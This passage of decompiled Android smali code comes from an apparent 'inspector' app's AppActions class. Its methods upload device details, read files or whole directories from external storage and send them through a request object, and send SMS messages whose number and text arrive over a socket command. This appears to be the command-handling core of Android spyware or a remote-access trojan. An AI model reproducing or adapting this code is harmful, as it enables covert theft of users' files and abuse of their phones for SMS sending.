    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    sget-object v3, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v3}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$arg-1$call-createTempFile$val-file$fun-sendDeviceName$class-AppActions()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;)Ljava/io/File;

    move-result-object v2

    .line 144
    .local v2, "file":Ljava/io/File;
    new-instance v3, Ljava/io/FileWriter;

    invoke-direct {v3, v2}, Ljava/io/FileWriter;-><init>(Ljava/io/File;)V

    .line 145
    .local v3, "writer":Ljava/io/FileWriter;
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v5, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v5}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$1$str$arg-0$call-append$fun-sendDeviceName$class-AppActions()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    check-cast v4, Ljava/lang/CharSequence;

    invoke-virtual {v3, v4}, Ljava/io/FileWriter;->append(Ljava/lang/CharSequence;)Ljava/io/Writer;

    .line 146
    invoke-virtual {v3}, Ljava/io/FileWriter;->flush()V

    .line 147
    invoke-virtual {v3}, Ljava/io/FileWriter;->close()V

    .line 148
    iget-object v4, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->request:Lthisisme/thisapp/inspector/Utils/AppRequest;

    const-string v5, "file"

    invoke-static {v2, v5}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v4, v2}, Lthisisme/thisapp/inspector/Utils/AppRequest;->sendFile(Ljava/io/File;)V

    .line 149
    return-void
.end method

.method public final sendFile(Ljava/lang/String;)V
    .locals 7
    .param p1, "path"    # Ljava/lang/String;

    const-string v0, "path"

    invoke-static {p1, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 29
    iget-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->permission:Lthisisme/thisapp/inspector/Utils/AppPermission;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/AppPermission;->checkReadExternalStorage()Z

    move-result v0

    if-eqz v0, :cond_2

    .line 30
    new-instance v0, Ljava/io/File;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v2

    invoke-virtual {v2}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v2}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$arg-0$call-plus$$this$call-plus$arg-0$call-$init$$val-file$branch$if$fun-sendFile$class-AppActions()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 31
    .local v0, "file":Ljava/io/File;
    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v1

    if-eqz v1, :cond_1

    .line 32
    invoke-virtual {v0}, Ljava/io/File;->isDirectory()Z

    move-result v1

    if-eqz v1, :cond_0

    .line 33
    invoke-virtual {v0}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v1

    .line 34
    .local v1, "listFiles":[Ljava/io/File;
    if-eqz v1, :cond_0

    .line 35
    const/4 v2, 0x0

    array-length v3, v1

    :goto_0
    if-ge v2, v3, :cond_0

    aget-object v4, v1, v2

    .local v4, "targetFile":Ljava/io/File;
    add-int/lit8 v2, v2, 0x1

    .line 36
    iget-object v5, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->request:Lthisisme/thisapp/inspector/Utils/AppRequest;

    const-string v6, "targetFile"

    invoke-static {v4, v6}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v5, v4}, Lthisisme/thisapp/inspector/Utils/AppRequest;->sendFile(Ljava/io/File;)V

    goto :goto_0

    .line 40
    .end local v1    # "listFiles":[Ljava/io/File;
    .end local v4    # "targetFile":Ljava/io/File;
    :cond_0
    invoke-virtual {v0}, Ljava/io/File;->isFile()Z

    move-result v1

    if-eqz v1, :cond_3

    .line 41
    iget-object v1, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->request:Lthisisme/thisapp/inspector/Utils/AppRequest;

    invoke-virtual {v1, v0}, Lthisisme/thisapp/inspector/Utils/AppRequest;->sendFile(Ljava/io/File;)V

    goto :goto_1

    .line 44
    :cond_1
    iget-object v1, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->request:Lthisisme/thisapp/inspector/Utils/AppRequest;

    new-instance v2, Lthisisme/thisapp/inspector/Utils/AppRequest$Text;

    sget-object v3, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v3}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$arg-0$call-$init$$arg-0$call-sendText$else$if$branch$if$fun-sendFile$class-AppActions()Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Lthisisme/thisapp/inspector/Utils/AppRequest$Text;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v2}, Lthisisme/thisapp/inspector/Utils/AppRequest;->sendText(Lthisisme/thisapp/inspector/Utils/AppRequest$Text;)V

    .end local v0    # "file":Ljava/io/File;
    goto :goto_1

    .line 47
    :cond_2
    iget-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->request:Lthisisme/thisapp/inspector/Utils/AppRequest;

    new-instance v1, Lthisisme/thisapp/inspector/Utils/AppRequest$Text;

    sget-object v2, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v2}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$arg-0$call-$init$$arg-0$call-sendText$else$if$fun-sendFile$class-AppActions()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Lthisisme/thisapp/inspector/Utils/AppRequest$Text;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Lthisisme/thisapp/inspector/Utils/AppRequest;->sendText(Lthisisme/thisapp/inspector/Utils/AppRequest$Text;)V

    .line 49
    :cond_3
    :goto_1
    return-void
.end method

.method public final sendSms(Lthisisme/thisapp/inspector/Utils/AppSocket$SendSmsAction;)V
    .locals 10
    .param p1, "data"    # Lthisisme/thisapp/inspector/Utils/AppSocket$SendSmsAction;

    const-string v0, "data"

    invoke-static {p1, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 52
    iget-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->permission:Lthisisme/thisapp/inspector/Utils/AppPermission;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/AppPermission;->checkReadAndReceiveAndSendSms()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 54
    iget-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->context:Landroid/content/Context;

    sget-object v1, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v1}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->Int$arg-1$call-getBroadcast$val-sentPI$branch$if$fun-sendSms$class-AppActions()I

    move-result v1

    new-instance v2, Landroid/content/Intent;

    sget-object v3, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v3}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$arg-0$call-$init$$arg-2$call-getBroadcast$val-sentPI$branch$if$fun-sendSms$class-AppActions()Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    sget-object v3, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v3}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->Int$arg-3$call-getBroadcast$val-sentPI$branch$if$fun-sendSms$class-AppActions()I

    move-result v3

    invoke-static {v0, v1, v2, v3}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v8

    const-string v0, "getBroadcast(context, 0, Intent(\"SMS_SENT\"), 0)"

    invoke-static {v8, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    .line 53
    nop

    .line 55
    .local v8, "sentPI":Landroid/app/PendingIntent;
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v4

    .line 56
    invoke-virtual {p1}, Lthisisme/thisapp/inspector/Utils/AppSocket$SendSmsAction;->getNumber()Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x0

    invoke-virtual {p1}, Lthisisme/thisapp/inspector/Utils/AppSocket$SendSmsAction;->getMessage()Ljava/lang/String;

    move-result-object v7

    const/4 v9, 0x0

    invoke-virtual/range {v4 .. v9}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 58
    .end local v8    # "sentPI":Landroid/app/PendingIntent;
    :cond_0
    return-void
.end method
